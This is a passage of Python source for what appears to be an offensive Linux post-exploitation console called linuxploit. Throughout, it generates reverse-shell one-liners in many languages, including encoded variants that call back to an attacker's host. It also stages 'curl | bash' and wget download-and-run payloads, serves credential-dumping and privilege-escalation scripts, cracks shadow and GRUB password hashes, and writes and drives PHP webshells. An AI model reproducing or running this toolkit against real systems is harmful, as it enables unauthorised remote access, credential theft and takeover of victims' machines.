			print("""\033[1;34m
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


 """ %(lhost,lport))
		elif modinput=="7" or modinput=="use 7" or modinput=="use payload-php_reverse_tcp" or modinput=="payload-php_reverse_tcp":
			lhost=input("FRLf(payload-php_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-php_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")
			print("""\033[1;34m
php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'

 """ %(lhost,lport))
		elif modinput=="8" or modinput=="use 8" or modinput=="use payload-ruby_reverse_tcp" or modinput=="payload-ruby_reverse_tcp":
			lhost=input("FRLf(payload-ruby_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-ruby_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")
			print(f"""\033[1;34m
ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'


 """)
		elif modinput=="9" or modinput=="use 9" or modinput=="use payload-socat_reverse_tcp" or modinput=="payload-socat_reverse_tcp":
			lhost=input("FRLf(payload-socat_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-socat_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")
			print(f"""\033[1;34m
socat -d -d -d TCP4:{lhost}:{lport} EXEC:/bin/bash
 """)
		elif modinput=="10" or modinput=="use 10" or modinput=="use payload-netcat_reverse_tcp" or modinput=="payload-netcat_reverse_tcp":
			lhost=input("FRLf(payload-netcat_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-netcat_reverse_tcp   Enter the LPORT)> ")
			b64=base64.b64encode(f"nc -e /bin/sh {lhost} {lport} & disown && clear".encode("utf-8"))
			b32=base64.b32encode(f"nc -e /bin/sh {lhost} {lport} & disown && clear".encode("utf-8"))
			b642=base64.b64encode(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f".encode('utf-8'))
			b322=base64.b32encode(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f".encode('utf-8'))
			print("\nPayload: \n")
			print(f"""\033[1;34m
nc -e /bin/bash {lhost} {lport} & disown && clear

\033[1;39mAlternate:(if nc doesn't Support -e option)[Excellent] \033[1;34m

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
""")
			print(f"\033[1;33mBASE64 Encoded : \033[1;34mbase64 -d <<< {b64.decode('utf-8')} | bash \n")
			print(f"\033[1;33mBASE32 Encoded : \033[1;34mbase32 -d <<< {b32.decode('utf-8')} | bash \n")
			print("\nAlternate : \n")
			print(f"\033[1;33mBASE64 Encoded : \033[1;34mbase64 -d <<< {b642.decode('utf-8')} | bash \n")
			print(f"\033[1;33mBASE32 Encoded : \033[1;34mbase32 -d <<< {b322.decode('utf-8')} | bash \n")
		elif modinput=="11" or modinput=="use 11" or modinput=="use payload-lua_reverse_tcp" or modinput=="payload-lua_reverse_tcp":
			lhost=input("FRLf(payload-lua_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-lua_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")
			print(f"""\033[1;34m
lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 """)
		elif modinput=="12" or modinput=="use 12" or modinput=="use payload-curl_reverse_tcp" or modinput=="payload-curl_reverse_tcp":
			html=open("curl_stage/index.html","w+")
			lhost=input("FRLf(payload-curl_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-curl_reverse_tcp   Enter the LPORT)> ")
			b64=base64.b64encode(f"setsid bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode("utf-8"))
			#html.write(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
			html.write(f"base64 -d <<< {b64.decode('utf-8')} | bash")
			html.close()
			srvport=input("FRLf(payload-curl_reverse_tcp   Enter the SRVPORT)> ")
			payload = """
Payload Syntax:
curl http://< Your IP>:<http port> | bash   --> paste this and enter in client machine

 			"""
			print(payload)
			for ip in nf.interfaces():
				try:
					ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
					print("Network Interface:")
					print("")
					print(f"\033[1;39m	{ip}  : {ipaddr}")
					if ipaddr == lhost:
						print(f"\n \033[1;33mPayload for interface {ip} [May be appropriate]:")
						print(f"\033[1;34m	curl http://{ipaddr}:{srvport} | bash\n")
					else:
						print(f"\n \033[1;33mPayload for Interface {ip} :")
						print(f"\033[1;34m	curl http://{ipaddr}:{srvport} | bash \n")
				except KeyError:
					print(f"Interface {ip} has no assigned IP")
					pass
			print(f"\033[1;37mOpen linuxploit in another terminal and use handler or use nc -klvp {lport} in another terminal\n")
			print("http server started to stage curl payload....")
			os.system(f"python3 -m http.server {srvport} -d curl_stage/")
		elif modinput=="13" or modinput=="use 13" or modinput=="use payload-telnet_reverse_tcp" or modinput=="payload-telnet_reverse_tcp":
			lhost=input("FRLf(payload-telnet_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-telnet_reverse_tcp   Enter the LPORT)> ")			
			print("\nPayload: \n")
			print(f"""\033[1;34m

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {lhost} {lport} >/tmp/f
			""")
		elif modinput=="99" or modinput=="use 99" or modinput=="use tcp_handler" or modinput=="tcp_handler":
			lport=input("FRLf(tcp_handler   Enter the LPORT)> ")
			if lport.isdigit() and int(lport) > 0 and int(lport) <= 65535:
				print("Handler started.........")
				os.system(f"./handler -klp {lport}")
			else:
				print("Invalid LPORT!")
		elif modinput=="14" or modinput=="use 14" or modinput=="use post/linenum" or modinput=="post/linenum":
			srvport=input("FRLf(post/LinEnum   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load LinEnum:\n")
						print(f"[!]    Load and Run LinEnum in client by :    wget http://{ipaddr}:{srvport}/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/linenum/")
			else:
				print("Invalid SRVPORT!")

		elif modinput=="15" or modinput=="use 15" or modinput=="use post/linpeas" or modinput=="post/linpeas":
			srvport=input("FRLf(post/linpeas   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load linpeas:\n")
						print(f"[!]    Load and Run linpeas in client by :    wget http://{ipaddr}:{srvport}/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/linpeas/")
			else:
				print("Invalid SRVPORT!")

		elif modinput=="16" or modinput=="use 16" or modinput=="use post/pspy" or modinput=="post/pspy":
			srvport=input("FRLf(post/pspy   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load pspy:\n")
						print(f"[!]    Load and Run pspy 32bit in client by :    wget http://{ipaddr}:{srvport}/pspy32 && chmod +x pspy32 && ./pspy32 \n")
						print(f"[!]    Load and Run pspy 64bit in client by :    wget http://{ipaddr}:{srvport}/pspy64 && chmod +x pspy64 && ./pspy64 \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/pspy/")
			else:
				print("Invalid SRVPORT!")


		elif modinput=="17" or modinput=="use 17" or modinput=="use post/unix-privesc-check" or modinput=="post/unix-privesc-check":
			srvport=input("FRLf(post/unix-privesc-check   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load unix-privesc-check:\n")
						print(f"[!]    Load and Run unix-privesc-check in client by :    wget http://{ipaddr}:{srvport}/unix-privesc-check && chmod +x unix-privesc-check && ./unix-privesc-check detailed \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/unix-privesc/")
			else:
				print("Invalid SRVPORT!")


		elif modinput=="18" or modinput=="use 18" or modinput=="use post/linux-exploit-suggester" or modinput=="post/linux-exploit-suggester":
			srvport=input("FRLf(post/linux-exploit-suggester   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load linux-exploit-suggester:\n")
						print(f"[!]    Load and Run linux-exploit-suggester in client by :    wget http://{ipaddr}:{srvport}/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/linux-exploit-suggester/")
			else:
				print("Invalid SRVPORT!")


		elif modinput=="19" or modinput=="use 19" or modinput=="use post/logrotten" or modinput=="post/logrotten":
			srvport=input("FRLf(post/logrotten   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load logrotten:\n")
						print(f"[!]    Load and Run logrotten in client by :    wget http://{ipaddr}:{srvport}/logrotten && chmod +x logrotten && ./logrotten -h \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/logrotten/")
			else:
				print("Invalid SRVPORT!")

		elif modinput=="20" or modinput=="use 20" or modinput=="use post/spawn_shell" or modinput=="post/spawn_shell":
			print("""
Python:
	python -c 'import pty; pty.spawn("/bin/sh")'

	echo os.system('/bin/bash')
Shell:
	/bin/sh -i
Perl:
	perl —e 'exec "/bin/sh";'

	perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')


(From within IRB):
	exec "/bin/sh"

(From within vi):
	:!bash

(From within vi):
	:set shell=/bin/bash:shell
			
			 """)

		elif modinput=="21" or modinput=="use 21" or modinput=="use post/nc_portfwd_pivot" or modinput=="post/nc_portfwd_pivot":
			srvport=input("FRLf(post/nc_portfwd_pivot   Enter the SRVPORT)> ")
			fport=input("FRLf(post/nc_portfwd_pivot   Enter client port to forward)> ")
			rhost=input("FRLf(post/nc_portfwd_pivot   Enter the RHOST to pivot to)> ")
			cport=input("FRLf(post/nc_portfwd_pivot   Enter the port to connect to)> ")
			if srvport.isdigit() and int(srvport) <= 65535 and fport.isdigit() and cport.isdigit():
				print(f"If client machine has nc:	nc -klp {fport} -c 'nc {rhost} {cport}'")
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load nc:\n")
						print(f"[!]    Load and forward port in client by :    wget http://{ipaddr}:{srvport}/nc && chmod +x nc && ./nc -klp {fport} -c './nc {rhost} {cport}' \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/linpeas/")
			else:
				print("Invalid PORT number given!")
		elif modinput=="22" or modinput=="use 22" or modinput=="use post/ssh_local_portfwd" or modinput=="post/ssh_local_portfwd":
			print("Authentication to RHOST is required..")
			host="localhost"
			fport=input("FRLf(post/ssh_local_portfwd   Enter port to bind in localhost[forwarded])> ")
			rhost=input("FRLf(post/ssh_local_portfwd   Enter the RHOST[Pwned Client] )> ")
			cport=input("FRLf(post/ssh_local_portfwd   Enter the RPORT to bind RHOST)> ")
			sshuser=input("FRLf(post/nc_portfwd_pivot   Enter the SSH_USERNAME)>")
			print(f" SSH will bind to port {cport} on your {host}. Any traffic that comes to this port is sent to the SSH server.Then, the traffic received is sent to port {fport} on {host}\n")
			os.system(f"ssh -L {cport}:{host}:{fport} {sshuser}@{rhost}")
		elif modinput=="23" or modinput=="use 23" or modinput=="use post/ssh_remote_portfwd" or modinput=="post/ssh_remote_portfwd":
			print("Authentication to RHOST is required..")
			host=input("FRLf(post/ssh_remote_portfwd   Enter the Remote Ip to Connect[behind NAT | firewall])> ")
			fport=input("FRLf(post/ssh_remote_portfwd   Enter port to Connect Remote IP)> ")
			rhost=input("FRLf(post/ssh_remote_portfwd   Enter the RHOST[Pwned Client] )> ")
			cport=input("FRLf(post/ssh_remote_portfwd   Enter the RPORT to bind on ssh server[Pwned Client])> ")
			sshuser=input("FRLf(post/ssh_remote_portfwd   Enter the SSH_USERNAME)>")
			os.system(f"ssh -R {cport}:{host}:{fport} {sshuser}@{rhost}")
		elif modinput=="24" or modinput=="use 24" or modinput=="use post/mimipenguin" or modinput=="post/mimipenguin":
			srvport=input("FRLf(post/mimipenguin   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load mimipenguin:\n")
						print(f"[!]    Load and Run mimipenguin in client by :    wget http://{ipaddr}:{srvport}/mimipenguin.sh && chmod 755 mimipenguin.sh && ./mimipenguin.sh \n")
						print(f"[!]    Load and Run mimipenguin in client by :    wget http://{ipaddr}:{srvport}/mimipenguin.sh && sudo chmod 755 mimipenguin.sh && sudo bash mimipenguin.sh \n")
						print(f"[!]    Load and Run mimipenguin.py in client by :    wget http://{ipaddr}:{srvport}/mimipenguin.py && sudo chmod 755 mimipenguin.py && sudo bash mimipenguin.py \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/mimi/")
			else:
				print("Invalid SRVPORT!")

		elif modinput=="25" or modinput=="use 25" or modinput=="use post/gather_wifi_creds" or modinput=="post/gather_wifi_creds":
			srvport=input("FRLf(post/gather_wifi_creds   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load wifi_creds_gather:\n")
						print(f"[!]    Load and Run wifigather.sh in client by :    wget http://{ipaddr}:{srvport}/wifigather.sh && chmod 755 wifigather.sh && ./wifigather.sh \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/wifigather/")
			else:
				print("Invalid SRVPORT!")
		elif modinput=="26" or modinput=="use 26" or modinput=="use post/linuxprivchecker" or modinput=="post/linuxprivchecker":
			srvport=input("FRLf(post/linuxprivchecker   Enter the SRVPORT)> ")
			if srvport.isdigit() and int(srvport) <= 65535:
				for ip in nf.interfaces():
					try:
						ipaddr=nf.ifaddresses(ip)[nf.AF_INET][0]['addr']
						print("Network Interface:")
						print(f"	{ip}  : {ipaddr}\n")
						print("Load linuxprivchecker:\n")
						print(f"[!]    Load and Run linuxprivchecker in client by :    wget http://{ipaddr}:{srvport}/linuxprivchecker.py && chmod +x linuxprivchecker.py && python linuxprivchecker.py \n")
					except KeyError:
						pass
				os.system(f"python3 -m http.server {srvport} -d post/linuxprivchecker/")
			else:
				print("Invalid SRVPORT!")
		elif modinput=="27" or modinput=="use 27" or modinput=="use post/crack_shadow_hash" or modinput=="post/crack_shadow_hash":
			print("")
			hashe=input("\033[1;39m (Enter/Paste The Hash :)> ")
			hashed=str(hashe)
			print("")
			wordlist=input("\033[1;39m (Enter the Path/Wordlist :)> ")
			if os.path.isfile(wordlist):
				starttime=datetime.datetime.now()
				print(f"\033[1;33m CRACKER started start-time:=> {starttime.hour}:{starttime.minute}:{starttime.second}:{starttime.microsecond} Date:=> day:{starttime.day}/month:{starttime.month}/year:{starttime.year} ..............\033[1;32m")
				wfile=open(wordlist,"r", encoding='UTF-8')
				words=wfile.read().split("\n")
				wfile.close()
				shadow_valid=re.compile(":")
				shadowcolon=shadow_valid.findall(hashed)
				if shadowcolon.count(":") > 0 and not hashed.startswith("$"):
					shadowhash=hashed.split(":")[1]
					print(f"FOUND USER FROM GIVEN HASH > Username : {hashed.split(':')[0]}")
					if shadowhash.startswith("$1$"):
						print("Found Algorithm MD5crypt....!")
					elif shadowhash.startswith("$2a$"):
						print("Found Algorithm BLOWFISH....!")
					elif shadowhash.startswith("$2y$"):
						print("Found Algorithm BLOWFISH....!")
					elif shadowhash.startswith("$5$"):
						print("Found Algorithm SHA256crypt....!")
					elif shadowhash.startswith("$6$"):
						print("Found Algorithm SHA512crypt....!")
				elif shadowcolon.count(":") > 0 and hashed.startswith("$"):
					shadowhash=hashed.split(":")[0]
					if shadowhash.startswith("$1$"):
						print("Found Algorithm MD5crypt....!")
					elif shadowhash.startswith("$2a$"):
						print("Found Algorithm BLOWFISH....!")
					elif shadowhash.startswith("$2y$"):
						print("Found Algorithm BLOWFISH....!")
					elif shadowhash.startswith("$5$"):
						print("Found Algorithm SHA256crypt....!")
					elif shadowhash.startswith("$6$"):
						print("Found Algorithm SHA512crypt....!")
	
				else:
					shadowhash=hashed
					if shadowhash.startswith("$1$"):
						print("Found Algorithm MD5crypt....!")
					elif shadowhash.startswith("$2a$"):
						print("Found Algorithm BLOWFISH....!")
					elif shadowhash.startswith("$2y$"):
						print("Found Algorithm BLOWFISH....!")
					elif shadowhash.startswith("$5$"):
						print("Found Algorithm SHA256crypt....!")
					elif shadowhash.startswith("$6$"):
						print("Found Algorithm SHA512crypt....!")
					else:
						print("Error: Unknown Shadow hash!!!")
						print("Exit, Bye!")
				for passwd in words:
					word=passwd
					if crypt.crypt(word,shadowhash)==shadowhash:
						print(f"HASH CRACKED : {shadowhash}")
						print(f"\033[1;36m PASSWORD :=> {passwd} \033[1;37m")
						print("<=========================================================================================================================>")
						print('CRACKER exited, bye bye')
						break
					else:
						pass
			else:
				print("WORDLIST FILE NOT FOUND!!")
		elif modinput=="28" or modinput=="use 28" or modinput=="use post/crack_grub2_pbkdf2" or modinput=="post/crack_grub2_pbkdf2":
			print("")
			hashe=input("\033[1;39m (Enter/Paste The Hash :)> ")
			hashed=str(hashe)
			print("")
			wordlist=input("\033[1;39m (Enter the Path/Wordlist :)> ")
			if os.path.isfile(wordlist):
				starttime=datetime.datetime.now()
				print(f"\033[1;33m CRACKER started start-time:=> {starttime.hour}:{starttime.minute}:{starttime.second}:{starttime.microsecond} Date:=> day:{starttime.day}/month:{starttime.month}/year:{starttime.year} ..............\033[1;32m")
				wfile=open(wordlist,"r", encoding='UTF-8')
				words=wfile.read().split("\n")
				wfile.close()
				for passwd in words:
					word=passwd
					if passlib.hash.grub_pbkdf2_sha512.verify(word,hashed):
						print(f"HASH CRACKED : {hashed}")
						print(f"\033[1;36m PASSWORD :=> {passwd} \033[1;37m")
						print("<=========================================================================================================================>")
						print('CRACKER exited, bye bye')
						break
				else:
					pass
			else:
				print("WORDLIST FILE NOT FOUND!!")
		elif modinput=="29" or modinput=="use 29" or modinput=="use php_webshell" or modinput=="php_webshell":
			file=input("FRLf(php_webshell Enter the path/outfile)> ")
			shell="<?php system($_REQUEST['cmd']) ?>"
			shell_file=open(file,"w+")
			shell_file.write(shell)
			shell_file.close()
			print(f""" 
use webshell_handler or curl http:/<host>:<port>/<upload_path>/{file}?cmd=<your command>
			""")
		elif modinput=="30" or modinput=="use 30" or modinput=="use php_webshell_gui" or modinput=="php_webshell_gui":
			file=input("FRLf(php_webshell_gui Enter the path/outfile)> ")
			shell="""
<html>
<head>
<style>
body {background-color:black;color:lightgreen;}
button {background-color:blue;color:red;}
</style> 
</head>
<body>
<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<button type="SUBMIT">Execute</button>
</form>
<pre>
<?php
    if(isset($_POST['cmd']))
    {
        system($_POST['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
			"""
			shell_file=open(file,"w+")
			shell_file.write(shell)
			shell_file.close()
			print(f""" 
Open Your Browser and go to -->  http:/<host>:<port>/<upload_path>/{file}
			""")
		elif modinput=="31" or modinput=="use 31" or modinput=="use webshell_handler" or modinput=="webshell_handler":
			url=input("FRLf(webshell_handler Enter the URL/shell_PATH )>")
			cmd=""
			while cmd!="exit":
				cmd=input("linuxploit-webshell>> ")
				print("")
				req=requests.post(url,data={"cmd":cmd})	
				print(req.text)		

		elif modinput=="exit" or modinput=="quit":
			print("\n \033[1;33mLinuxploit Exited ,, Happy Hacking!")
			exit()
		elif modinput=="use":
			print("use command should follow a module name!")
		elif modinput=="bannerq" or modinput=="clear":
			os.system("clear")
		elif modinput.startswith("exec:") or modinput.startswith("os:"):
			cmd=mod.split(":")
			os.system(cmd[1])
		elif modinput.startswith("exec "):
			os.system(mod[5:])
		elif modinput.startswith("os "):
			os.system(mod[3:])
		elif modinput=="banner":
			os.system("clear")
			random.shuffle(banners)
			print(banners[0])
		elif modinput=="sysinfo" or modinput=="machine_info" or modinput=="systeminfo":
			plat=platform.platform()
			version=platform.version()
			arch=platform.machine()
			processor=platform.processor()
			print(f"""\033[1;33m 

OS Platform      ==> {plat}
OS Build Version ==> {version}
OS Architecture  ==> {arch}
Processor        ==> {processor}
			
			""")
		elif modinput=="whoami" or modinput=="current_user":
			print(f"\033[1;33m Current User : {os.getlogin()}\n")
			print(f"Home Directory : {os.path.expanduser('~')}")
		elif modinput=="help gtfobins":
			print(gtfobins_help)
		elif modinput.startswith("gtfobins "):
			data=requests.get(f"https://gtfobins.github.io/gtfobins/{modinput[9:]}/")
			if data.status_code==200:
				page=BeautifulSoup(data.text,"html.parser")
				for script in page(["script","style"]):
					script.extract()
				gtf=page.get_text()
				print(gtf.strip())
			else:
				print("THE BINARY YOU SEARCHED FOR NOT FOUND IN GTFOBINS!!")
			
		else:
			print("\033[1;31mUnknown linuxploit Command!")
	except KeyboardInterrupt:
		print("\033[1;31m febrev-linuxploit!> User Interruption Detected ... Please Type 'exit' command in the console to exit!")
	except KeyError:
		print("\033[1;31m Error!")
	except ValueError:
		print("\033[1;31mError: Something wrong....")
	except requests.exceptions.ConnectionError:
		print("\033[1;31mConnection to the Server Failed. Check Your Internet connection,URL and try again\n ")
	except requests.exceptions.ReadTimeout:
		print("Connection to the Server Failed, Timed Out!!\n ")
	except UnicodeDecodeError:
		print("\033[1;31mSorry UnicodeDecode error: Couldn't Read that wordlist at the moment....")
	except requests.exceptions.ConnectionError:
		print("\033[1;31mConnection to the Server Failed, May be invalid URL or bad Internet connection. Check Your Internet connection,URL and try again\n ")
	except requests.exceptions.ReadTimeout:
		print("\033[1;31mError : EXECUTION STOPPED DUE TO !TIMED OUT! ERROR, YOUR INTERNET MAY BE DISCONNECTED!!!....EXITTED")
	
while True:
	try:
		linuxploit()
	except KeyboardInterrupt:
		print("\033[1;31m febrev-linuxploit!> User Interruption Detected ... Please Type 'exit' command in the console to exit!")
		linuxploit()
